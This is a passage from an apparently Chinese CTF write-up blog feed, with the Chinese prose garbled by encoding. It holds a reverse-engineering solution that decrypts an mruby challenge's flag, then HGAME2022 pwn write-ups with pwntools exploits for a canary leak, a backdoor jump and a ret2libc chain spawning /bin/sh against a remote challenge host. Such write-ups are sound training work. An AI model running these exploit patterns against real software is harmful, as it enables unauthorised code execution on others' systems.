class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b41c0</span>)</span></span><br><span class="line">      027 SENDBR8:timesn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//å¾ªç¯YYæ¬¡</span></span><br><span class="line">      <span class="number">031</span> MOVER8R5; R5:y</span><br><span class="line">      <span class="number">034</span> MOVER9R6; R6:z</span><br><span class="line">          <span class="comment">//è¿”å›y,z</span></span><br><span class="line">      <span class="number">037</span> ARRAYR8R8<span class="number">2</span></span><br><span class="line">      <span class="number">040</span> RETURNR8</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b41c0</span> nregs=<span class="number">10</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">0</span> ilen=<span class="number">186</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:i</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="comment">//ä¸å¤ªé‡è¦çš„ä½æ“ä½œ</span></span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> GETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">008</span> GETUPVARR4<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">012</span> LOADI_3R5</span><br><span class="line">      <span class="number">014</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">018</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">022</span> LOADI_5R6</span><br><span class="line">      <span class="number">024</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">028</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">032</span> GETUPVARR5<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">036</span> ADDR4R5</span><br><span class="line">      <span class="number">038</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">042</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">046</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">050</span> LOADIR8<span class="number">11</span></span><br><span class="line">      <span class="number">053</span> SENDR7:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">057</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">060</span> LOADI_3R8</span><br><span class="line">      <span class="number">062</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">066</span> GETIDXR6R7</span><br><span class="line">      <span class="number">068</span> ADDR5R6</span><br><span class="line">      <span class="number">070</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">074</span> ADDR3R4</span><br><span class="line">      <span class="number">076</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">080</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">083</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">087</span> SETUPVARR3<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">091</span> GETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">095</span> GETCONSTR4XX</span><br><span class="line">      <span class="number">098</span> ADDR3R4</span><br><span class="line">      <span class="number">100</span> SETUPVARR3<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">104</span> GETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">108</span> GETUPVARR4<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">112</span> LOADI_3R5</span><br><span class="line">      <span class="number">114</span> SENDR4:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">118</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">122</span> LOADI_5R6</span><br><span class="line">      <span class="number">124</span> SENDR5:&gt;&gt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">128</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">132</span> GETUPVARR5<span class="number">5</span><span class="number">0</span></span><br><span class="line">      <span class="number">136</span> ADDR4R5</span><br><span class="line">      <span class="number">138</span> GETUPVARR5<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">142</span> GETUPVARR6<span class="number">3</span><span class="number">0</span></span><br><span class="line">      <span class="number">146</span> GETUPVARR7<span class="number">7</span><span class="number">0</span></span><br><span class="line">      <span class="number">150</span> ADDIR7<span class="number">1</span></span><br><span class="line">      <span class="number">153</span> LOADI_3R8</span><br><span class="line">      <span class="number">155</span> SENDR7:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">159</span> GETIDXR6R7</span><br><span class="line">      <span class="number">161</span> ADDR5R6</span><br><span class="line">      <span class="number">163</span> SENDR4:^n=<span class="number">1</span></span><br><span class="line">      <span class="number">167</span> ADDR3R4</span><br><span class="line">      <span class="number">169</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">173</span> LOADLR4L(<span class="number">0</span>); <span class="number">4294967295</span></span><br><span class="line">      <span class="number">176</span> SENDR3:&amp;n=<span class="number">1</span></span><br><span class="line">      <span class="number">180</span> SETUPVARR3<span class="number">6</span><span class="number">0</span></span><br><span class="line">      <span class="number">184</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4320</span> nregs=<span class="number">13</span> nlocals=<span class="number">8</span> pools=<span class="number">2</span> syms=<span class="number">7</span> reps=<span class="number">0</span> ilen=<span class="number">128</span><span class="comment">// ä¸»é€»è¾‘check()</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">  R3:i</span><br><span class="line">  R4:lst_ch</span><br><span class="line">  R5:c</span><br><span class="line">  R6:k</span><br><span class="line">  R7:cipher_text</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> LOADI_0R3; R3:i</span><br><span class="line">      <span class="number">006</span> LOADI_0R4; R4:lst_ch</span><br><span class="line">          <span class="comment">//iå’Œlst_chåˆè¯•å‡ä¸º0</span></span><br><span class="line">      <span class="number">008</span> MOVER8R3; R3:i</span><br><span class="line">      <span class="number">011</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">014</span> SENDR9:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">018</span> LTR8R9</span><br><span class="line">      <span class="number">020</span> JMPNOTR8<span class="number">086</span></span><br><span class="line">          <span class="comment">//ä»¥ä¸Šæ˜¯å¯¹iåšå¾ªç¯ï¼Œæ¡ä»¶ä¸º`for i in range(len(p))`</span></span><br><span class="line">      <span class="number">024</span> MOVER8R1; R1:p</span><br><span class="line">      <span class="number">027</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">030</span> GETIDXR8R9</span><br><span class="line">          <span class="comment">//å–p[i]</span></span><br><span class="line">      <span class="number">032</span> SENDR8:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">036</span> MOVER5R8; R5:c</span><br><span class="line">          <span class="comment">//ord(p[i])èµ‹å€¼ç»™c</span></span><br><span class="line">      <span class="number">039</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">042</span> MOVER9R4; R4:lst_ch</span><br><span class="line">      <span class="number">045</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//å–cå’Œlst_chè¿›è¡Œå¼‚æˆ–</span></span><br><span class="line">      <span class="number">049</span> MOVER9R3; R3:i</span><br><span class="line">      <span class="number">052</span> ADDIR9<span class="number">1</span></span><br><span class="line">          <span class="comment">//å–i+1</span></span><br><span class="line">      <span class="number">055</span> SENDR8:^n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//å°†c^lst_chçš„ç»“æœå’Œ(i+1)å¼‚æˆ–</span></span><br><span class="line">      <span class="number">059</span> SENDR8:chrn=<span class="number">0</span></span><br><span class="line">          <span class="comment">//å°†è¯¥ç»“æœchrå›æ¥</span></span><br><span class="line">      <span class="number">063</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">066</span> MOVER10R3; R3:i</span><br><span class="line">      <span class="number">069</span> MOVER11R8</span><br><span class="line">      <span class="number">072</span> SETIDXR9R10R11</span><br><span class="line">          <span class="comment">//å°†chråçš„å­—ç¬¦èµ‹å€¼ç»™p[i]</span></span><br><span class="line">      <span class="number">074</span> MOVER8R5; R5:c</span><br><span class="line">      <span class="number">077</span> MOVER4R8; R4:lst_ch</span><br><span class="line">          <span class="comment">//æŠŠcçš„å€¼èµ‹ç»™lst_ch</span></span><br><span class="line">      <span class="number">080</span> ADDIR3<span class="number">1</span>; R3:i</span><br><span class="line">      <span class="number">083</span> JMP<span class="number">008</span></span><br><span class="line">          <span class="comment">//æ­¥é•¿å¾ªç¯ä¸º1</span></span><br><span class="line">      <span class="number">086</span> STRINGR6<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; aaaassssddddffff; R6:k</span><br><span class="line">          <span class="comment">//å¾ªç¯ç»“æŸåå®šä¹‰k=&#x27;aaaassssddddffff&#x27;</span></span><br><span class="line">      <span class="number">089</span> GETCONSTR8Crypt</span><br><span class="line">      <span class="number">092</span> GETMCNSTR8R8::CIPHER</span><br><span class="line">      <span class="number">095</span> MOVER9R1; R1:p</span><br><span class="line">      <span class="number">098</span> MOVER10R6; R6:k</span><br><span class="line">      <span class="number">101</span> SENDR8:encryptn=<span class="number">2</span></span><br><span class="line">          <span class="comment">//è°ƒç”¨Crypt.CIPHER.encrypt(p, k)</span></span><br><span class="line">      <span class="number">105</span> MOVER7R8; R7:cipher_text</span><br><span class="line">      <span class="number">108</span> MOVER8R7; R7:cipher_text</span><br><span class="line">          <span class="comment">//å°†åŠ å¯†ç»“æœèµ‹å€¼ç»™cipher_text</span></span><br><span class="line">      <span class="number">111</span> STRINGR9<span class="title function_">L</span><span class="params">(<span class="number">1</span>)</span>; f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb</span><br><span class="line">      <span class="number">114</span> EQR8R9</span><br><span class="line">          <span class="comment">//å°†cipher_textä¸f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdbè¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">      <span class="number">116</span> JMPNOTR8<span class="number">124</span></span><br><span class="line">      <span class="number">120</span> LOADTR8</span><br><span class="line">      <span class="number">122</span> RETURNR8</span><br><span class="line">      <span class="number">124</span> LOADFR8</span><br><span class="line">      <span class="number">126</span> RETURNR8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_key</span>(<span class="params">p</span>):</span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p), <span class="number">4</span>):</span><br><span class="line">        a.append(<span class="built_in">int</span>(p.encode()[i:i+<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line">c = <span class="string">&quot;f469358b7f165145116e127ad6105917bce5225d6d62a714c390c5ed93b22d8b6b102a8813488fdb&quot;</span></span><br><span class="line">XX = <span class="number">305419896</span></span><br><span class="line">YY = <span class="number">16</span></span><br><span class="line">key = to_key(<span class="string">&quot;aaaassssddddffff&quot;</span>)</span><br><span class="line"> </span><br><span class="line">dec = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">16</span>):</span><br><span class="line">    num1 = <span class="built_in">int</span>(c[i:i+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    num2 = <span class="built_in">int</span>(c[i+<span class="number">8</span>:i+<span class="number">16</span>], <span class="number">16</span>)</span><br><span class="line">    y = num1  <span class="comment"># R5</span></span><br><span class="line">    z = num2  <span class="comment"># R6</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        s = s + XX</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(YY):</span><br><span class="line">        z = z - ((((y &lt;&lt; <span class="number">3</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (s + key[(s + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        z = z &amp; <span class="number">0xffffffff</span></span><br><span class="line">        s = s - XX</span><br><span class="line">        y = y - ((((z &lt;&lt; <span class="number">3</span>) ^ (z &gt;&gt; <span class="number">5</span>)) + z) ^ (s + key[((s &gt;&gt; <span class="number">11</span>) + <span class="number">1</span>) &amp; <span class="number">3</span>]))</span><br><span class="line">        y = y &amp; <span class="number">0xffffffff</span></span><br><span class="line">    dec[i//<span class="number">2</span>:i//<span class="number">2</span>+<span class="number">4</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(y)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line">    dec[i//<span class="number">2</span>+<span class="number">4</span>:i//<span class="number">2</span>+<span class="number">8</span>] = <span class="built_in">bytes</span>.fromhex((<span class="string">&quot;0000&quot;</span>+<span class="built_in">hex</span>(z)[<span class="number">2</span>:])[-<span class="number">8</span>:])</span><br><span class="line"><span class="built_in">print</span>(dec.<span class="built_in">hex</span>())</span><br><span class="line">lst_ch = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec)):</span><br><span class="line">    c = dec[i]</span><br><span class="line">    dec[i] = (c ^ (i + <span class="number">1</span>)) ^ lst_ch</span><br><span class="line">    lst_ch = dec[i]</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒç ”é€‰æ‰‹æ¥æ‘¸é±¼ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¹´å›½èµ›èœå¾—å¾ˆå¿«ä¹ï¼Œè¶Ÿå¾—ä¹Ÿå¾ˆå¿«ä¹~&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2022</title>
    <link href="http://example.com/2022/01/24/hgame2022/"/>
    <id>http://example.com/2022/01/24/hgame2022/</id>
    <published>2022-01-24T07:19:07.000Z</published>
    <updated>2023-02-01T14:30:53.472Z</updated>
    
    <content type="html"><![CDATA[<p>é—²ç€æ—¶å°±å»æ‰“äº†ä¸‹æ­ç”µçš„ HGAME2022ï¼Œä»¥ä¸ºç¬¬ä¸€å‘¨çš„é¢˜ç›®éƒ½ä¼šè›®ç®€å•çš„ï¼Œæ²¡æƒ³åˆ°æ¯é“é¢˜éƒ½èŠ±äº†ä¸å°‘åŠŸå¤«ï¼Œå‡ºé¢˜äººç”šè‡³è¿˜åªæ˜¯å¤§äºŒå­¦ç”Ÿï¼Œé¡¿æ—¶æ„Ÿè§‰åˆ°å‚å·®äº†ã€‚</p><span id="more"></span><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="test-your-gdb"><a href="#test-your-gdb" class="headerlink" title="test_your_gdb"></a>test_your_gdb</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/142799/6/33729/24698/63c7a9bcF35bfad36/6fed4a2b8bff6c89.png" style="zoom:80%;" /><p>å†çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/101274/4/36756/155822/63c7a9feF099d1b28/cfdd54cc86c9145f.png" style="zoom:80%;" /><p>åŠ¨è°ƒç›´æ¥å»çœ‹åŠ å¯†åçš„ s2ï¼Œæˆ‘ä»¬å¤§æ¦‚åœåœ¨åˆ¤æ–­ä½ç½®å¤„ï¼Œçœ‹ä¸€ä¸‹ s2 å³ <strong>rsi</strong> çš„å€¼</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/160500/8/33195/17712/63c7aa34F130596f6/e241e939f93143d9.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/137137/5/32624/66896/63c7aa4dF03e59ce9/efe2f0a3602f0da7.png" style="zoom:80%;" /><p>ä¸Šå›¾æ˜¾ç¤ºä¸å…¨ï¼Œå› ä¸ºä¸€å…±è¦æ¯”è¾ƒ 16 ä¸ªå­—èŠ‚ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55339/21/22199/50202/63c7aa63F62dce033/9aee5be3ca36bf1b.png" style="zoom:80%;" /><p>æ‰€ä»¥ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./a.out&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">50610</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">backdoor=<span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">io.send(p64(<span class="number">0xb0361e0e8294f147</span>)+p64(<span class="number">0x8c09e0c34ed8a6a9</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;enter your pass word\n&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">24</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary===&gt;&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="enter-the-pwn-land"><a href="#enter-the-pwn-land" class="headerlink" title="enter_the_pwn_land"></a>enter_the_pwn_land</h3><p>å…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/75946/29/24063/23754/63c7aaa1Fdf2816d1/56fe50f63cfa50e0.png" style="zoom:80%;" /><p>çœ‹ä¸€ä¸‹ä¸»è¦å‡½æ•°ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98042/24/22695/37543/63c7aaa0F7e0149da/03e9383158ddc998.png" style="zoom: 80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>å¯ä»¥çœ‹åˆ°ä¸æ–­åˆ›é€ çº¿ç¨‹è¿›å…¥ä¸€ä¸ªå¸¦æœ‰æ ˆæº¢å‡ºæ¼æ´çš„å‡½æ•°ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œv3 ä½œä¸º read çš„è¿”å›å€¼å’Œ i ä½œä¸º s çš„å‚æ•°å†³å®šäº†è¯»å…¥çš„ä½ç½®ï¼Œè¿™ä¸¤è€…åœ¨è¦†ç›–çš„æ—¶å€™å‡ä¸åº”è¢«æ”¹å˜ï¼ˆä¸æ–­çš„æµ‹è¯•å‘ç° v3 ä¸èƒ½å˜ï¼Œi æŒ‰ç†è¯´å¯ä»¥å˜æˆä¸‹ä¸€æ¬¡æƒ³è¯»å…¥çš„ä½ç½®ï¼‰ã€‚</p><p>æ¸…æ¥šè¿™ä¸€ç‚¹åï¼Œexp å°±æ˜¯æ™®é€šçš„ ret2libcï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">34686</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;./a&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401313</span></span><br><span class="line">call_puts=<span class="number">0x0401090</span></span><br><span class="line">vul=<span class="number">0x04011BA</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">0x404028</span>)+p64(call_puts)</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">setbuf_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc=======&gt;&quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;setbuf&quot;</span>]))</span><br><span class="line">log.success(<span class="string">&quot;setbuf===&gt;&quot;</span>+<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line">libc_base=setbuf_addr-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#libc_base=read_addr-libc.sym[&quot;read&quot;]</span></span><br><span class="line"><span class="comment">#log.success(&quot;read_addr====&gt;&quot;+hex(libc.sym[&quot;read&quot;]))</span></span><br><span class="line"><span class="comment">#log.success(&quot;libc_base====&gt;&quot;+hex(libc_base))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x2c</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šæ‰“è¿œç¨‹çš„æ—¶å€™å‘ç°æ³„éœ² read çš„å‡½æ•°åœ°å€è®¡ç®—åŸºå€æ—¶ä¼šæœ‰åå·®ï¼Œæ‰€ä»¥æ¢äº† setbuf å°±æˆäº†ã€‚libc-2.31 ä¹Ÿéœ€è¦æ ˆå¯¹é½ã€‚</p><h3 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h3><p>é¢˜ç›®å’Œä¸Šé¢˜ç¨æœ‰å˜åŒ–ï¼Œä¿æŠ¤æ–¹é¢å¤šå¼€å¯äº†ä¸ª canary</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/163026/7/33522/24750/63c7aaa0Fcb1ef617/3becf79a7f742530.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107429/9/24505/38663/63c7aaa0F8c72c750/90f78d20ec80e81e.png" style="zoom:80%;" /><p>å½“æ—¶çš„ç¬¬ä¸€ä¸ªæƒ³æ³•æ˜¯åˆ©ç”¨ puts æ³„éœ²canaryï¼Œä¸è¿‡å›è¿‡ç¥æ¥å‘ç° puts è¿‡åå°±ç›´æ¥æ£€æµ‹ canary äº†ï¼Œæ‰€ä»¥æ‰“æ¶ˆè¿™ä¸ªå¿µå¤´ã€‚</p><p>è®°å¿†ä¸­å…¶ä»–ç»•è¿‡ canary çš„æ–¹æ³•æœ‰<strong>åŠ«æŒ _stack_chk_fail</strong>ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯<strong>åŒæ—¶ä¿®æ”¹ canary å’Œ TLS ç»“æ„ä½“</strong>ä¸­é¢„å­˜çš„ canaryã€‚å‰è€…ä¸€èˆ¬éœ€è¦ä»»æ„å†™ï¼Œåè€…çš„è¯å°è±¡ä¸­æ²¡é‡åˆ°è¿‡ã€‚ä¸è¿‡ä¼¼ä¹æœ‰ä¸€ç§ stack smash æ³„éœ²ä¿¡æ¯çš„å·§å¦™æ–¹æ³•ï¼Œè¿™å°±è§¦å‘äº†æˆ‘çš„è„‘æ´ï¼Œä¼šä¸ä¼šï¼Œæœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼ŒTLS ç»“æ„ä½“å°±è¢«å¸ƒç½®åœ¨äº†<strong>æ ˆ</strong>ä¸Šï¼Ÿå†µä¸”è¿™é“é¢˜æº¢å‡ºçš„ç©ºé—´è¿˜ä¸å°‘ã€‚</p><p>äºæ˜¯æˆ‘å°± gdb è°ƒè¯•äº†ä¸€ä¸‹ï¼Œçœ‹äº†ä¸€ä¸‹æ ˆä¸Šçš„ä¿¡æ¯</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/167708/4/31793/115472/63c7ab82F05d5d258/d54bbde560c2ee86.png" style="zoom:67%;" /><p>ç„¶åå°±ç»§ç»­å¾€ä¸‹æ‰¾ï¼Œç»ˆäºåœ¨å¾ˆè¿œå¤„å‘ç°äº†å¯ç–‘ç›®æ ‡ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/57709/16/23077/110254/63c7ab96F17f3a3e3/d2ac97e9c74302f9.png" style="zoom:80%;" /><p>æ­¤æ—¶æˆ‘åŒæ—¶å°†ä¸¤å¤„è¦†ç›–ä¸º<code>aaaaaaaa</code>ï¼Œå‘ç°ç¨‹åºä¸å†æŠ¥ stack smash é”™è¯¯ï¼Œè¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸç»•è¿‡äº† canaryï¼Œéœ€è¦è¯´æ˜çš„æ˜¯è¿œç¨‹åç§»å’Œæœ¬åœ°ä¸ä¸€æ ·ï¼Œé€è¿‡å»çš„æ•°æ®å°½é‡å¤§å°±è¡Œã€‚</p><p>ç»§ç»­æ‰“ ret2libc æ„é€  system(â€˜/bin/shâ€™)æ‰“ä¸é€šã€‚</p><p>åŸå› ä¸è¯¦ï¼ŒçŒœæµ‹æ˜¯æ 